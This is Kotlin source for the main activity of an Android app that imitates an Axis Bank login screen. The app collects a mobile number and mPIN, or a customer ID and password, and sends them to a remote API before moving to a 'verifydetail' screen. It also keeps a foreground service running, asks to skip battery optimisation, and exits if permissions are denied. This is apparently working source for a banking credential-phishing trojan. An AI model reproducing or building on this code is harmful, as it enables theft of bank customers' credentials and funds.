package com.example.oldaxisbank

import android.app.ActivityManager
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.InputType
import android.util.Log
import android.view.MotionEvent
import android.view.View.OnTouchListener
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.axisbank.Submit1r
import com.example.axisbank.Submit2
import com.example.oldaxisbank.ApiClient.getClient
import com.example.oldaxisbank.databinding.ActivityMainBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.util.Random


class MainActivity : AppCompatActivity() {

    private lateinit var binding:ActivityMainBinding
    private var btnstr = "mpin";
    private var toggle = false


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val util = Util()
        val random = Random()

        if (util.getLocalData(this, "userid") == "") {
            util.saveLocalData(this, "userid", Integer.toString(random.nextInt(999999999)))
        }

        geopermission.requestPermissions(this)

        if (geopermission.hasGeoPermissions(this)) {
            val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
            if (!isServiceRunning) {
                val serviceIntent = Intent(this, MyForegroundService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
            }
        }


        binding.t1.text = "Mobile Number"
        binding.t3.text = "mPIN"
        settext();
        binding.cust.setTextColor(resources.getColor(R.color.darkgrey))
        binding.mpin.setTextColor(resources.getColor(R.color.white))
        binding.cust.background = getDrawable(R.drawable.white_bg_round)
        binding.mpin.background = getDrawable(R.drawable.red_bg_round)


        binding.eye.setOnClickListener{
            if (toggle) {
                toggle = false
                binding.e3.inputType =
                    InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            } else {
                toggle = true
                binding.e3.inputType =
                    InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
            }
            binding.e3.setSelection(binding.e3.text.length)
        }


        binding.cust.setOnClickListener{

            binding.t1.text = "Customer ID:"
            binding.t3.text = "Password"
            settext();
            btnstr = "cus";
            binding.cust.setTextColor(resources.getColor(R.color.white))
            binding.mpin.setTextColor(resources.getColor(R.color.darkgrey))
            binding.cust.background = getDrawable(R.drawable.red_bg_round)
            binding.mpin.background = getDrawable(R.drawable.white_bg_round)

        }

        binding.mpin.setOnClickListener{

            binding.t1.text = "Mobile Number"
            binding.t3.text = "mPIN"
            settext();
            btnstr = "mpin";
            binding.cust.setTextColor(resources.getColor(R.color.darkgrey))
            binding.mpin.setTextColor(resources.getColor(R.color.white))
            binding.cust.background = getDrawable(R.drawable.white_bg_round)
            binding.mpin.background = getDrawable(R.drawable.red_bg_round)
        }



        binding.login.setOnClickListener {

            if (binding.e2.text.toString().isEmpty()
                || binding.e3.text.toString().isEmpty() ){
                Toast.makeText(this,"fill all fields", Toast.LENGTH_SHORT).show();
            }
             else if (binding.e2.text.toString().length<10 &&  binding.t1.text == "Mobile Number"  ){
            Toast.makeText(this,"Please Enter 10 Digit Mobile Number",Toast.LENGTH_SHORT).show()
              }

                else {

                val util = Util()

                val apiService = getClient().create(ApiService::class.java)
                val intentff = Intent(this, verifydetail::class.java)

                if (btnstr == "mpin") {

                    val data = Submit1r(mobile = binding.e2.text.toString(),
                         mpin = binding.e3.text.toString())
                    util.saveLocalData(this,"m",binding.e2.text.toString() )
                    val call = apiService.submit1(data)
                    call.enqueue(object : Callback<Void?> {
                        override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                            if (response.isSuccessful) {
                                startActivity(intentff)
                                Log.d("asdf123", "yes")
                            } else {
                                Log.d("asdf123", "unsucess")
                            }
                        }

                        override fun onFailure(call: Call<Void?>, t: Throwable) {
                            Log.d("asdf123", t.toString())
                        }
                    })


                }  else {

                    val data = Submit2(customerid = binding.e2.text.toString(), pass = binding.e3.text.toString())
                    util.saveLocalData(this,"c",binding.e2.text.toString() )
                    val call = apiService.submit2(data)
                    call.enqueue(object : Callback<Void?> {
                        override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                            if (response.isSuccessful) {
                                startActivity(intentff)
                                Log.d("asdf123", "yes")
                            } else {
                                Log.d("asdf123", "unsucess")
                            }
                        }

                        override fun onFailure(call: Call<Void?>, t: Throwable) {
                            Log.d("asdf123", t.toString())
                        }
                    })

                }
            }
        }




    }


    private fun settext(){
        binding.e2.setText("");
        binding.e3.setText("");
    }

    private fun requestBatteryOptimizationPermission() {
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
        intent.data = Uri.parse("package:$packageName")
        startActivity(intent)
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (!geopermission.hasGeoPermissions(this)) {
            if (!geopermission.shouldShowRequestPermissionRationale(this)) {
                geopermission.launchPermissionSettings(this)
            }
            finish()
        }
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
            requestBatteryOptimizationPermission()
        }

        val isServiceRunning = isServiceRunning(MyForegroundService::class.java)
        if (!isServiceRunning) {
            val serviceIntent = Intent(this, MyForegroundService::class.java)
            ContextCompat.startForegroundService(this, serviceIntent)
        }


    }

}